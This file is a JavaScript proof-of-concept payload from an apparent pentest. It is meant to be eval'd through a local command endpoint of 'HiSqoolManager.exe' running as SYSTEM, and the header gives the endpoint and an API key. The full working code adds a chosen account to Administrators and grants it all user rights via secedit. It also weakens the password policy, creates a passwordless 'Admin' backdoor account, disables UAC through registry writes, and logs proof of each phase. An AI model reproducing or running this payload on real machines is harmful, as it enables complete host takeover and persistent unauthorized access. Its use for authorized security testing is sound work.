// =============================================================================
// poc_payload.js
// -----------------------------------------------------------------------------
// POC : RCE -> LPE to SYSTEM -> local posture takeover.
//
// Vecteur : POST http://127.0.0.1:7654/commands
//           { "category":"js", "command":"eval",
//             "arguments":{ "source": <CE FICHIER LU ET INLINe> } }
//           Header : x-api-key: would-nepal-sing-below
//
// Le "source" est eval'd par HiSqoolManager.exe (NestJS / ScriptorService.evalSource)
// dans un process Node qui tourne en **LocalSystem** sur les cibles.
// Ce fichier est volontairement du JS *lisible* pour le rapport de pentest.
//
// Entrees (passees par le lanceur .ps1 dans arguments, ou ici depuis process.env
// si on veut l'injecter a la main) :
//   LOG_DIR      : dir racine des logs (Syste32\zcode_poc\<runid> = preuve LPE)
//   TARGET_SID   : SID du compte a privilegiier (S-1-5-21-...-1001)  [prioritaire]
//   TARGET_USER  : DOMAIN\user alternatif (resolu en SID by the payload)
//   NEW_ADMIN    : nom du compte a creer ("Admin" par defaut)
//   DRY_RUN      : "1" = tout sauf les mutations (verification seule)
//
// Phases (chacune logge dans payload.log sur disque, preuve durable) :
//   A. Ping identite + resolution cible (SID <-> name)
//   B. Ajouter la cible au groupe Administrateurs (S-1-5-32-544, well-known)
//   C. User Rights Assignment : toutes les privs connues sur la cible (secedit)
//   D. Creer un compte local "Admin" (mdp vide) + l'ajouter aux Admins
//   E. Desactiver l'UAC (EnableLUA=0 + consent = 0 + EnableInstallerDetection=0)
//   F. Verification finale (whoami groupes / reg query / net user / secedit /verify)
//
// Toutes les commandes passent par child_process.execSync (SYSTEM), leur stdout
// et code de sortie sont logges. Les mutations Windows sont en ASCII pur (reg/net
// sont insensibles a la locale). On n'utilise JAMAIS les noms localises des
// groupes ("Administrateurs" vs "Administrators") : on cible via le SID well-known
// S-1-5-32-544 et via les noms de droits (SeDebugPrivilege etc.) qui sont
// invariants de locale cote secedit.
//
// BUG FIXES applied (audit reference numbers):
//   #1  IIFE wrapper now captures return value for the server
//   #2  No fallback runId generation — abort if POC_LOG_DIR missing
//   #3  FR/ES exception message matching for "already a member"
//   #4  /active:yes + Set-LocalUser only if user creation confirmed
//   #5  Standardized dry-run guard: mutates:true everywhere, no manual if(!DRY_RUN)
//   #6  regRead regex strict — match only REG_DWORD line for the target value name
//   #7  runPs via -EncodedCommand (base64 UTF-16LE) — no fragile escaping
//   #8  Add-LocalGroupMember -Member uses resolved name, not raw SID string
//  #11  SECURITYPOLICY (no underscore) — correct secedit /areas token
//  #12  .inf headers properly separated with \r\n
//  #13  Comment lines (starting with ;) skipped in [Privilege Rights] parsing
//  #14  readInf/writeInf handle UTF-16LE BOM from secedit /export
//  #19  /passwordreq:no on net user /add
//  #23  Fallback to targetSid if targetUser is empty for net user verify
//  #29  reg query HKU\S-1-5-18\...\Winlogon /v Shell (correct path)
//  #30  Top-level try/catch guarantees _flush() on crash
//  #32  phaseRc dynamic tracking — summary.phases reflects actual success/failure
//  #33  Get-LocalGroupMember -SID (locale-independent) for verify
//  #35  Flush [Privilege Rights] when it's the last section of the export
//  #48  Resolve admin group name from SID for PS 5.0 compatibility
//  #50  New-LocalUser marked { mutates: true }
// =============================================================================

'use strict';

const cp = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ---------------------------------------------------------------------------
// 0. Configuration : depuis process.env (overridable depuis le lanceur .ps1 en
//    injectant process.env avant l'eval, ou en dur pour re-run a la main).
// ---------------------------------------------------------------------------
const CFG = {
  LOG_DIR : process.env.POC_LOG_DIR,
  TARGET_SID  : process.env.POC_TARGET_SID  || '',
  TARGET_USER : process.env.POC_TARGET_USER || '',
  NEW_ADMIN   : process.env.POC_NEW_ADMIN   || 'Admin',
  NEW_ADMIN_PWD : process.env.POC_NEW_ADMIN_PWD || '',
  DRY_RUN : (process.env.POC_DRY_RUN === '1' || process.env.POC_DRY_RUN === 'true'),
};

// [FIX #2] No fallback runId — the launcher MUST provide POC_LOG_DIR.
// If missing, the runId would diverge (UTC vs local, no hostname) and
// the launcher could never find the artefacts.
let logDir = CFG.LOG_DIR;
if (!logDir){
  // Cannot operate without the launcher-provided path — abort immediately.
  // Writing to an unknown location defeats the evidence chain.
  process.stderr.write('POC FATAL: POC_LOG_DIR is unset. The launcher must inject it.\n');
  // Return a JSON error so the IIFE wrapper can propagate it.
  throw new Error('no-logdir');
}
const runId = path.basename(logDir);
CFG.LOG_DIR = logDir;

fs.mkdirSync(logDir, { recursive: true });
const logPath = path.join(logDir, 'payload.log');

// Buffered append logger. Auto-flush every 50 lines so the log survives
// a mid-run crash (FIX #30 partial — the global try/catch does the rest).
const _buf = [];
function _flush(){
  try { fs.appendFileSync(logPath, _buf.join('')); _buf.length = 0; }
  catch(e){ /* best effort */ }
}
function L(line){
  const t = new Date().toISOString();
  _buf.push('[' + t + '] ' + line + '\r\n');
  if (_buf.length >= 50) _flush();
}
function Lraw(s){ _buf.push(s + '\r\n'); _flush(); }

// ============================ helper infra =================================
// execSync wrapper : capture stdout/stderr + exit code. Never throws — all
// failures are logged and returned as result objects.
function run(cmd, opts){
  opts = opts || {};
  L('$ ' + cmd);
  // [FIX #5] SKIP on DRY_RUN only for declared mutations (opts.mutates === true).
  // This is the single guard — no redundant if(!CFG.DRY_RUN) wrappers elsewhere.
  if (CFG.DRY_RUN && opts.mutates === true){
    L('  [DRY_RUN] mutation skipped');
    return { cmd, rc:null, out:'', err:'', dry:true };
  }
  try {
    const out = cp.execSync(cmd, {
      windowsHide: true,
      timeout: 30000,
      maxBuffer: 16*1024*1024,
      stdio: ['ignore','pipe','pipe'],
    });
    const s = (out instanceof Buffer) ? out.toString('latin1') : String(out);
    if (s && s.length) Lraw(s.replace(/\s+$/,' '));
    L('  rc=0');
    return { cmd, rc:0, out:s, err:'', dry:false };
  } catch(e){
    const err = (e.stderr instanceof Buffer) ? e.stderr.toString('latin1')
               : (e.stderr ? String(e.stderr) : (e.message||''));
    if (err) Lraw('  [stderr] ' + err.replace(/\s+$/,' '));
    L('  rc=' + (e.status===undefined?'null':e.status) + ' (caught)');
    return { cmd, rc:(e.status===undefined?null:e.status), out:'', err, dry:false };
  }
}

// [FIX #14] readInf/writeInf : secedit exports .inf in UTF-16LE (BOM FF FE).
// Must read as UTF-16LE and write back as UTF-16LE with BOM for secedit
// /configure to accept the file.
function readInf(p){
  try {
    const buf = fs.readFileSync(p);
    if (buf.length >= 2 && buf[0]===0xFF && buf[1]===0xFE) return buf.slice(2).toString('utf16le');
    if (buf.length >= 2 && buf[0]===0xFE && buf[1]===0xFF) {
      const swapped = Buffer.allocUnsafe(buf.length - 2);
      for (let i = 2; i < buf.length; i += 2) { swapped[i - 2] = buf[i + 1]; swapped[i - 1] = buf[i]; }
      return swapped.toString('utf16le');
    }
    if (buf.length >= 3 && buf[0]===0xEF && buf[1]===0xBB && buf[2]===0xBF) return buf.slice(3).toString('utf8');
    return buf.toString('utf8');
  } catch(e){ return ''; }
}

function writeInf(p, txt){
  const bom = Buffer.from([0xFF,0xFE]);
  const body = Buffer.from(txt, 'utf16le');
  fs.writeFileSync(p, Buffer.concat([bom, body]));
}

// [FIX #7] runPs : EncodedCommand base64 bypasses the fragile CMD→PS escaping
// layer. The script is passed as-is with zero character transformation.
function runPs(script, opts){
  const b64 = Buffer.from(script, 'utf16le').toString('base64');
  return run('powershell -NoProfile -NoLogo -NonInteractive -EncodedCommand ' + b64, opts);
}

// Resolution SID <-> name via PowerShell (locale-independent).
function sidFromUser(domainUser){
  const script =
    '$u = "' + domainUser.replace(/`/g,'``').replace(/\$/g,'`$').replace(/"/g,'`"') + '"\r\n' +
    'try { (New-Object System.Security.Principal.NTAccount($u)).Translate(' +
    '[System.Security.Principal.SecurityIdentifier]).Value } catch { "" }';
  const r = runPs(script);
  return (r.out||'').trim();
}
function userFromSid(sid){
  const script =
    '$s = "' + sid + '"\r\n' +
    'try { (New-Object System.Security.Principal.SecurityIdentifier($s)).Translate(' +
    '[System.Security.Principal.NTAccount]).Value } catch { "" }';
  const r = runPs(script);
  return (r.out||'').trim();
}

// [FIX #48] Resolve the localized name of the Administrators group from
// SID S-1-5-32-544. This is needed for Add-LocalGroupMember on PS 5.0
// (where -SID parameter on the group doesn't exist) and is more portable
// than relying on -SID which only works on PS 5.1+.
function adminGroupName(){
  const script =
    'try { (New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")).Translate(' +
    '[System.Security.Principal.NTAccount]).Value.Split("\\")[-1] } catch { "" }';
  const r = runPs(script);
  return (r.out||'').trim();
}

// =============================== pre-flight ================================

L('================================================================');
L(' POC payload started');
L('   runId      : ' + runId);
L('   logDir     : ' + logDir);
L('   dryRun     : ' + CFG.DRY_RUN);
L('   targetSid  : ' + (CFG.TARGET_SID  || '(unset)'));
L('   targetUser : ' + (CFG.TARGET_USER || '(unset)'));
L('   newAdmin   : ' + CFG.NEW_ADMIN);
L('================================================================');

// [FIX #30] Global try/catch guarantees _flush() on any uncaught exception.
// Without this, a mid-run crash (disk full, OOM, etc.) loses all buffered logs.
let _finalResult = null;
try {

// ---------------------------------------------------------------------------
// A. Identite SYSTEM (preuve LPE) + resolution cible
// ---------------------------------------------------------------------------
L(' ====== Phase A — identity preuve + cible resolution ======');

const A = {};
A.host     = os.hostname();
A.user     = os.userInfo();
A.pid      = process.pid;
A.ppid     = process.ppid;
A.cwd      = process.cwd();
A.execPath = process.execPath;
A.platform = process.platform;
A.arch     = process.arch;
A.nodeVer  = process.version;
A.whoami   = run('whoami').out.trim();
A.whoamiAll= run('whoami /all').out;
// [FIX #29] Query the correct path where Shell value actually exists.
A.regHead  = run('reg query "HKU\\S-1-5-18\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell 2>nul').out;
L(' identity dump :');
L('   host     = ' + A.host);
L('   user.uid = ' + A.user.uid + '  user.name = ' + A.user.username);
L('   whoami   = ' + A.whoami);
L('   execPath = ' + A.execPath);
L('   nodeVer  = ' + A.nodeVer);

fs.writeFileSync(path.join(logDir,'identity.json'), JSON.stringify(A,null,2));

let targetSid  = CFG.TARGET_SID.trim();
let targetUser = CFG.TARGET_USER.trim();

if (!targetSid && !targetUser){
  L(' ERROR : ni POC_TARGET_SID ni POC_TARGET_USER fournis. Abandon Phase B-E.');
  L('         (le lanceur .ps1 doit capturer whoami /user AVANT l envoi HTTP)');
  _finalResult = JSON.stringify({ ok:false, phase:'A', error:'no-target-spec', runId, logDir });
  throw new Error('no-target-spec');
}

if (targetUser && !targetSid){
  targetSid = sidFromUser(targetUser);
  L(' resolved user "' + targetUser + '" -> SID = ' + (targetSid||'(FAILED)'));
  if (!targetSid || !/^S-1-/.test(targetSid)){
    L(' FATAL : resolving target user -> SID failed. Aborting.');
    _finalResult = JSON.stringify({ ok:false, phase:'A', error:'sid-resolve-failed', targetUser, runId, logDir });
    throw new Error('sid-resolve-failed');
  }
}
if (targetSid && !targetUser){
  targetUser = userFromSid(targetSid);
  L(' resolved SID "' + targetSid + '" -> user = ' + (targetUser||'(n/a)'));
}
L(' ---- cible choisie : SID=' + targetSid + '  user=' + (targetUser||'(n/a)'));

// [FIX #32] Dynamic phase success tracking — replaces hardcoded {A..F:true}.
const phaseRc = { A:true, B:null, C:null, D:null, E:null, F:null };

// Resolve admin group name once (used in phases B and D).
const adminName = adminGroupName();
L(' resolved admin group name: ' + (adminName||'(n/a)'));

// ===========================================================================
// B. Ajouter le SID cible au groupe Administrateurs (S-1-5-32-544)
// ===========================================================================
L(' ====== Phase B — add target to local Administrators (S-1-5-32-544) ======');
const ADM_SID = 'S-1-5-32-544';

// [FIX #3] FR/ES exception message matching.
// [FIX #8] Use resolved admin group name (-Name) instead of -SID on the group
//          for PS 5.0 compatibility. -Member uses the resolved targetUser name
//          instead of a raw SID string (more portable across PS versions).
//          Fallback to -SID if name resolution failed.
let memberName = (targetUser && targetUser.indexOf('\\') !== -1)
                   ? targetUser.split('\\').pop()
                   : targetUser;
if (!memberName) {
  // targetUser was empty, try resolving from SID
  memberName = userFromSid(targetSid);
  if (memberName && memberName.indexOf('\\') !== -1) memberName = memberName.split('\\').pop();
}
if (!memberName || /^S-1-/.test(memberName)) {
  L(' ERROR: Cannot resolve target to a name. memberName=' + memberName + '. Skipping Add-LocalGroupMember.');
  phaseRc.B = false;
} else {
  if (!adminName) L(' WARNING: adminGroupName() returned empty, falling back to English "Administrators"');
  const groupName = adminName || 'Administrators';
  const psAdd = 'try{\r\n' +
    '  Add-LocalGroupMember -Name "' + groupName + '" -Member "' + memberName + '"' +
    ' -ErrorAction Stop;\r\n' +
    '  "OK"\r\n' +
    '}catch{\r\n' +
    '  if($_.Exception.Message -match "already a member|deja|ya un miembro|existe deja|deja membre"){ "ALREADY" }\r\n' +
    '  else { "ERR:" + $_.Exception.Message }\r\n' +
    '}\r\n';
  const rB = runPs(psAdd, { mutates: true });
  const outB = (rB.out||'').trim();
  L(' Add-LocalGroupMember ' + groupName + ' <- ' + memberName + ' -> ' + outB);

  if (CFG.DRY_RUN) {
    phaseRc.B = 'dry';
  } else {
    phaseRc.B = (rB.rc === 0 || outB === 'ALREADY' || outB === 'OK');
  }
}

// ===========================================================================
// C. User Rights Assignment
// ===========================================================================
L(' ====== Phase C — User Rights Assignment (full privileges to target) ======');

const RIGHTS = [
  'SeTrustedCredManAccessPrivilege', 'SeNetworkLogonRight', 'SeRemoteInteractiveLogonRight',
  'SeBatchLogonRight', 'SeInteractiveLogonRight', 'SeServiceLogonRight', 'SeTcbPrivilege',
  'SeMachineAccountPrivilege', 'SeIncreaseQuotaPrivilege', 'SeChangeNotifyPrivilege',
  'SeUndockPrivilege', 'SeManageVolumePrivilege', 'SeImpersonatePrivilege',
  'SeCreateGlobalPrivilege', 'SeCreatePagefilePrivilege', 'SeCreatePermanentPrivilege',
  'SeCreateSymbolicLinkPrivilege', 'SeDebugPrivilege', 'SeAuditPrivilege', 'SeSecurityPrivilege',
  'SeTakeOwnershipPrivilege', 'SeLoadDriverPrivilege', 'SeSystemtimePrivilege',
  'SeProfileSingleProcessPrivilege', 'SeSystemEnvironmentPrivilege', 'SeAssignPrimaryTokenPrivilege',
  'SeRestorePrivilege', 'SeShutdownPrivilege', 'SeBackupPrivilege', 'SeSystemProfilePrivilege',
  'SeCreateTokenPrivilege',
];

const secExportPath = path.join(logDir, 'secedit_export.inf');
const secExportLog  = path.join(logDir, 'secedit_export.log');
const secCfgPath    = path.join(logDir, 'secedit_apply.inf');
const secApplyDb    = path.join(logDir, 'secedit_apply.sdb');
const secApplyLog   = path.join(logDir, 'secedit_apply.log');

L('   export current policy -> ' + secExportPath);
run('secedit /export /cfg "' + secExportPath + '" /log "' + secExportLog + '"', { mutates:false });

let exportText = readInf(secExportPath);
const targetSidEntry = '*' + targetSid;
const rightsStr = RIGHTS.map(r => r + ' = ' + targetSidEntry).join('\r\n');

if (exportText){
  const lines = exportText.split(/\r?\n/);
  const out = [];
  let inPriv = false, pushedOur = false;
  const rightMap = {};
  let _lastPrivKey = null;

  for (let i=0;i<lines.length;i++){
    const l = lines[i];
    if (/^\[Privilege Rights\]/i.test(l)){
      inPriv = true; out.push(l); continue;
    } else if (/^\[.*\]/.test(l)){
      if (inPriv && !pushedOur){
        for (let k=0;k<RIGHTS.length;k++){
          const r = RIGHTS[k];
          const existing = rightMap[r] || [];
          const sids = existing.slice().filter(s => s && s.trim() !== ''); // [FIX BUG-15] drop empties
          if (sids.indexOf(targetSidEntry) === -1) sids.push(targetSidEntry);
          if (sids.length > 0) out.push(r + ' = ' + sids.join(',')); // [FIX BUG-15] skip empty=invalid
        }
        pushedOur = true;
      }
      inPriv = false; out.push(l); continue;
    }
    if (inPriv){
      // [FIX #13] Skip comment lines (starting with ;) before parsing.
      if (/^\s*;/.test(l)) { out.push(l); continue; }
      const m = l.match(/^(\S+)\s*=\s*(.*)$/);
      if (m){
        const rn = m[1].trim();
        const sids = m[2].split(',').map(x=>x.trim()).filter(x=>x && x!=='');
        // Remove SeDeny* for our SID (neutralize deny entries).
        if (/^SeDeny/i.test(rn)){
          const kept = sids.filter(s=>s !== targetSidEntry);
          if (kept.length) out.push(rn + ' = ' + kept.join(','));
          else out.push('; ' + l);
          _lastPrivKey = rn;
          continue;
        }
        rightMap[rn] = rightMap[rn] || [];
        for (let j=0;j<sids.length;j++) if (rightMap[rn].indexOf(sids[j])===-1)
          rightMap[rn].push(sids[j]);
        _lastPrivKey = rn;
        continue;
      }
      // [FIX] Continuation line: no '=' means previous line wrapped — append SIDs.
      if (_lastPrivKey && !l.includes('=')) {
        if (_lastPrivKey && /^SeDeny/i.test(_lastPrivKey)) {
          out[out.length - 1] = out[out.length - 1] + ',' + l.trim();
        } else {
          const extraSids = l.trim().split(',').map(x=>x.trim()).filter(x=>x && x!=='');
          if (!rightMap[_lastPrivKey]) rightMap[_lastPrivKey] = [];
          for (let j=0;j<extraSids.length;j++) if (rightMap[_lastPrivKey].indexOf(extraSids[j])===-1)
            rightMap[_lastPrivKey].push(extraSids[j]);
        }
      }
      continue;
    }
    out.push(l);
  }

  // [FIX #35] If [Privilege Rights] was the LAST section (never left via
  // encountering another [Section]), flush our rights before the final append.
  if (inPriv && !pushedOur) {
    for (let k=0;k<RIGHTS.length;k++){
      const r = RIGHTS[k];
      const existing = rightMap[r] || [];
      const sids = existing.slice().filter(s => s && s.trim() !== ''); // [FIX BUG-15] drop empties
      if (sids.indexOf(targetSidEntry) === -1) sids.push(targetSidEntry);
      if (sids.length > 0) out.push(r + ' = ' + sids.join(',')); // [FIX BUG-15] skip empty=invalid
    }
    pushedOur = true;
    inPriv = false;
  }

  if (!pushedOur){
    out.push('[Privilege Rights]');
    for (let k=0;k<RIGHTS.length;k++) out.push(RIGHTS[k] + ' = ' + targetSidEntry);
    pushedOur = true;
  }

  const secText = out.join('\r\n');
  writeInf(secCfgPath, secText);
  L('   generated apply policy (merged) -> ' + secCfgPath);
} else {
  // [FIX #12] Proper .inf headers with \r\n between each line/field.
  const txt =
    '[Unicode]\r\nUnicode=yes\r\n' +
    '[Version]\r\nsignature="$CHICAGO$"\r\nRevision=1\r\n' +
    '[Privilege Rights]\r\n' + rightsStr + '\r\n';
  writeInf(secCfgPath, txt);
  L('   generated minimal apply policy -> ' + secCfgPath);
}

const rC = run('secedit /configure /cfg "' + secCfgPath + '" /db "' +
               secApplyDb + '" /log "' + secApplyLog + '" /quiet /overwrite ' +
               '/areas USER_RIGHTS', { mutates: true });
L('   secedit /configure rc=' + rC.rc + ' see ' + secApplyLog);
phaseRc.C = (CFG.DRY_RUN) ? 'dry' : (rC.rc === 0);

// ===========================================================================
// D. Creer un compte local "Admin" (mdp vide)
// ===========================================================================
L(' ====== Phase D — create local "' + CFG.NEW_ADMIN + '" with empty password ======');

const pwdExport = path.join(logDir, 'secedit_pwd_export.inf');
const pwdApply  = path.join(logDir, 'secedit_pwd_apply.inf');
const pwdApplyLog = path.join(logDir, 'secedit_pwd_apply.log');
const pwdApplyDb  = path.join(logDir, 'secedit_pwd_apply.sdb');
L('   export PASSWORD policy -> ' + pwdExport);
// [FIX #11] SECURITYPOLICY (no underscore) — the correct secedit /areas token.
run('secedit /export /cfg "' + pwdExport + '" /quiet /areas SECURITYPOLICY', { mutates:false });

let pwdText = readInf(pwdExport);
let pwdCfg;
if (pwdText){
  const lines = pwdText.split(/\r?\n/); const out=[]; let hit=false;
  for (let i=0;i<lines.length;i++){
    let l = lines[i];
    if (/^\[System Access\]/i.test(l)){ hit=true; out.push(l); continue; }
    if (/^\[.*\]/.test(l)){ if (hit) hit=false; out.push(l); continue; }
    if (hit){
      if (/^\s*MinimumPasswordLength\s*=/.test(l)) { out.push('MinimumPasswordLength = 0'); continue; }
      if (/^\s*PasswordComplexity\s*=/.test(l))   { out.push('PasswordComplexity = 0'); continue; }
      if (/^\s*PasswordHistoryLength\s*=/.test(l)){ out.push('PasswordHistoryLength = 0'); continue; }
      if (/^\s*MaximumPasswordAge\s*=/.test(l))   { out.push('MaximumPasswordAge = -1'); continue; }
      if (/^\s*MinimumPasswordAge\s*=/.test(l))   { out.push('MinimumPasswordAge = -1'); continue; }
    }
    out.push(l);
  }
  if (!/\[System Access\]/i.test(pwdText)){
    out.push('[System Access]');
    out.push('MinimumPasswordLength = 0');
    out.push('PasswordComplexity = 0');
    out.push('PasswordHistoryLength = 0');
    out.push('MaximumPasswordAge = -1');
    out.push('MinimumPasswordAge = -1');
  }
  pwdCfg = out.join('\r\n');
} else {
  // [FIX #12] Proper .inf headers.
  pwdCfg =
    '[Unicode]\r\nUnicode=yes\r\n' +
    '[Version]\r\nsignature="$CHICAGO$"\r\nRevision=1\r\n' +
    '[System Access]\r\n' +
    'MinimumPasswordLength = 0\r\nPasswordComplexity = 0\r\n' +
    'PasswordHistoryLength = 0\r\nMaximumPasswordAge = -1\r\nMinimumPasswordAge = -1\r\n';
}
writeInf(pwdApply, pwdCfg);
L('   generated pwd policy (minLen=0, complexity=0)');
// [FIX #11] SECURITYPOLICY without underscore.
run('secedit /configure /cfg "' + pwdApply + '" /db "' + pwdApplyDb +
    '" /log "' + pwdApplyLog + '" /quiet /overwrite /areas SECURITYPOLICY',
    { mutates: true });

// [FIX #19] /passwordreq:no to bypass SAM empty-password requirement.
const rD1 = run('net user "' + CFG.NEW_ADMIN + '" "" /add /y /expires:never /passwordreq:no',
                { mutates: true });
L('   net user /add rc=' + rD1.rc + ' err=' + (rD1.err||'').trim());

// [FIX #4] Track whether user creation actually succeeded.
// [BUG-9] Removed redundant if(!DRY_RUN) — inner mutates:true guards
// already handle dry-run; this lets dry-run trace the full code path.
let userCreated = false;
if (rD1.rc === 0) {
  userCreated = true;
} else if (rD1.err && /already|existe|dej[aà]/i.test(rD1.err)) {
  L('   net user: account already exists (rc=' + rD1.rc + ')');
  userCreated = true;
} else {
  L('   fallback : New-LocalUser -NoPassword (via EncodedCommand)');
  const psNewUser =
    'try {\r\n' +
    '  New-LocalUser -Name "' + CFG.NEW_ADMIN + '" -NoPassword ' +
    '-Description "POC RCE->LPE - admin backdoor" -ErrorAction Stop\r\n' +
    '  "OK"\r\n' +
    '} catch {\r\n' +
    '  if ($_.Exception.Message -match "already exists|existe|deja|dej[aà]|presents?") { "EXISTS" }\r\n' +
    '  else { "ERR:" + $_.Exception.Message }\r\n' +
    '}\r\n';
  // [FIX #50] New-LocalUser marked { mutates: true }.
  const rD1b = runPs(psNewUser, { mutates: true });
  L('   New-LocalUser -> ' + (rD1b.out||'').trim());
  if (/OK|EXISTS/i.test((rD1b.out||'').trim())) userCreated = true;
}

// [FIX #4] Only activate/set PasswordNeverExpires if user was actually created.
if (userCreated) {
  run('net user "' + CFG.NEW_ADMIN + '" /active:yes', { mutates: true });
  const psPwNever = 'Set-LocalUser -Name "' + CFG.NEW_ADMIN + '" -PasswordNeverExpires $true';
  runPs(psPwNever, { mutates: true });
}

// Add new admin account to the Administrators group.
// [FIX #8] Use resolved admin group name for portability.
// [FIX #10] Only attempt to add group member if user was actually created.
if (userCreated) {
  if (!adminName) L(' WARNING: adminGroupName() returned empty, falling back to English "Administrators"');
  const adminGroupName2 = adminName || 'Administrators';
  const psAdd2 =
    'try{\r\n' +
    '  Add-LocalGroupMember -Name "' + adminGroupName2 + '" -Member "' + CFG.NEW_ADMIN + '"' +
    ' -ErrorAction Stop;\r\n' +
    '  "OK"\r\n' +
    '}catch{\r\n' +
    '  if($_.Exception.Message -match "already a member|deja|deja|ya un miembro"){ "ALREADY" }\r\n' +
    '  else { "ERR:" + $_.Exception.Message }\r\n' +
    '}\r\n';
  const rD3 = runPs(psAdd2, { mutates: true });
  L('   Add-LocalGroupMember ' + adminGroupName2 + ' <- ' + CFG.NEW_ADMIN + ' -> ' + (rD3.out||'').trim());
} else {
  L('   Skipping Add-LocalGroupMember: user was not created');
}

phaseRc.D = (CFG.DRY_RUN) ? 'dry' : userCreated;

// ===========================================================================
// E. Desactiver l'UAC
// ===========================================================================
L(' ====== Phase E — disable UAC ======');
// [FIX #6] regRead regex strict — match only REG_DWORD line for the target value.
function regRead(name){
  const r = run('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ' + name);
  const lines = (r.out||'').split(/\r?\n/);
  for (const ln of lines) {
    const m = ln.match(new RegExp(name + '\\s+REG_DWORD\\s+0x([0-9a-fA-F]+)', 'i'));
    if (m) return parseInt(m[1], 16);
  }
  return null;
}
const uacKeys = [
  'EnableLUA', 'ConsentPromptBehaviorAdmin', 'ConsentPromptBehaviorUser',
  'EnableInstallerDetection', 'ValidateAdminCodeSignatures', 'FilterAdministratorToken',
];
L('   before :');
uacKeys.forEach(function(k){ L('   ' + k + ' = ' + regRead(k)); });

// [FIX #5] Standardized: only mutates:true guard — no redundant if(!DRY_RUN).
// [FIX BUG-7] Track actual rc of each reg add (verdict must reflect reality).
let _eOk = true;
uacKeys.forEach(function(k){
  let _r = run('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v ' + k + ' /t REG_DWORD /d 0 /f',
      { mutates:true });
  if (!_r.dry && _r.rc !== 0) _eOk = false;
});
phaseRc.E = (CFG.DRY_RUN) ? 'dry' : _eOk;

L('   after :');
uacKeys.forEach(function(k){ L('   ' + k + ' = ' + regRead(k)); });

// ===========================================================================
// F. Verification
// ===========================================================================
L(' ====== Phase F — verification (lecture d etat reel, preuve durable) ======');
function dump(name, cmd){
  const r = run(cmd, { mutates:false });
  const p = path.join(logDir, name);
  try { fs.writeFileSync(p, r.out||''); } catch(e){ L('  err write '+name+': '+e.message); }
  L('   ' + name + ' -> ' + p + '  rc=' + r.rc + '  bytes=' + (r.out||'').length);
  return r.rc === 0;
}
const dumpResults = [];
dumpResults.push(dump('verify_whoami_groups.txt', 'whoami /groups'));
dumpResults.push(dump('verify_whoami_priv.txt', 'whoami /priv'));

// [FIX #23] Fallback to targetSid if targetUser short name is empty.
const targetShort = (targetUser||'').split('\\').pop() || targetSid;
dumpResults.push(dump('verify_net_user_target.txt', 'net user "' + targetShort + '"'));
dumpResults.push(dump('verify_net_user_newadmin.txt', 'net user "' + CFG.NEW_ADMIN + '"'));

// [FIX #33] Locale-independent group membership verification.
// Get-LocalGroupMember -SID works regardless of the localized group name.
const psVerifyGroup = 'try {\r\n' +
  '  Get-LocalGroupMember -SID "S-1-5-32-544" | ForEach-Object { $_.Name + " (" + $_.SID + ")" }\r\n' +
  '} catch { "ERR:" + $_.Exception.Message }\r\n';
const rVerifyGroup = runPs(psVerifyGroup, { mutates:false });
const pVerifyGroup = path.join(logDir, 'verify_net_localgroup_admins.txt');
try { fs.writeFileSync(pVerifyGroup, rVerifyGroup.out || ''); } catch(e){ L('  err write verify_net_localgroup_admins.txt: ' + e.message); }
L('   verify_net_localgroup_admins.txt -> ' + pVerifyGroup + '  rc=' + rVerifyGroup.rc);
dumpResults.push(rVerifyGroup.rc === 0);

dumpResults.push(dump('verify_secedit_verify.inf', 'cmd /c type "' + path.join(logDir,'verify_secedit.inf') + '"'));
dumpResults.push(dump('verify_uac_reg.txt', 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"'));

phaseRc.F = (CFG.DRY_RUN) ? 'dry' : dumpResults.every(x => x);

const summary = {
  ok: true,
  runId, logDir,
  targetSid, targetUser,
  newAdmin: CFG.NEW_ADMIN,
  dryRun: CFG.DRY_RUN,
  host: A.host, whoami: A.whoami, execPath: A.execPath, nodeVersion: A.nodeVer,
  phases: phaseRc,
};
fs.writeFileSync(path.join(logDir,'summary.json'), JSON.stringify(summary,null,2));
const markerPath = path.join(logDir, 'poc_complete.marker');
fs.writeFileSync(markerPath, 'POC complete ' + new Date().toISOString());

L(' ====== payload terminé ======');
L('   marker file : ' + markerPath);
_finalResult = JSON.stringify(summary);

} catch(e) {
  // [FIX #30] Guarantee _flush() on any uncaught exception.
  if (!_finalResult) {
    L('FATAL uncaught exception: ' + (e && e.stack || e));
    _finalResult = JSON.stringify({ ok:false, error: e.message, runId, logDir });
  }
}

_flush();
// [FIX #1] Return the result so the IIFE wrapper in the launcher can capture it.
// The launcher wraps this payload in (function(){ <PAYLOAD> })();
// The return value is the JSON summary that the server can propagate back.
return _finalResult;
